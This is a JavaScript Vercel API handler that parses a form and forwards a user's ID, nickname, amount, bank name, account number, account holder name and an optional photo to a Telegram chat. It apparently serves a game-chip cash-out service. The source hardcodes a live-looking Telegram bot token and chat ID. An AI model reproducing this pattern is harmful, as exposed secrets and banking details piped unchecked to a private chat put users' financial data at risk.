// Anda perlu menginstal library 'formidable' atau menggunakan cara native jika di Vercel Node.js terbaru
// Namun, cara paling simpel untuk Vercel adalah meneruskan FormData langsung.

export const config = {
  api: {
    bodyParser: false, // Penting: Matikan bodyParser agar bisa menerima file gambar
  },
};

import { IncomingForm } from 'formidable';
import fs from 'fs';

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const form = new IncomingForm();
    
    form.parse(req, async (err, fields, files) => {
        if (err) return res.status(500).json({ status: 'error', message: err.message });

        const token = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
        const chat_id = "6604182176";
        
        // Ambil data teks (fields)
        const caption = `🔔 *BONGKAR CHIP* 🔔\n\n🆔 ID: ${fields.id}\n👤 Nick: ${fields.nick}\n💰 Jumlah: ${fields.jumlah}\n🏦 Bank: ${fields.bank}\n💳 No Rek: ${fields.norek}\n📛 Nama: ${fields.nama}`;

        const telegramFormData = new FormData();
        telegramFormData.append('chat_id', chat_id);
        telegramFormData.append('caption', caption);
        telegramFormData.append('parse_mode', 'Markdown');

        let method = 'sendMessage';

        // Cek jika ada file gambar
        if (files.file) {
            method = 'sendPhoto';
            const fileData = fs.readFileSync(files.file[0].filepath);
            const blob = new Blob([fileData], { type: files.file[0].mimetype });
            telegramFormData.append('photo', blob, files.file[0].originalFilename);
        } else {
            telegramFormData.append('text', caption);
        }

        try {
            const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
                method: 'POST',
                body: telegramFormData,
            });

            const result = await response.json();
            if (result.ok) {
                res.status(200).json({ status: 'success' });
            } else {
                res.status(500).json({ status: 'error', message: result.description });
            }
        } catch (error) {
            res.status(500).json({ status: 'error', message: error.message });
        }
    });
}
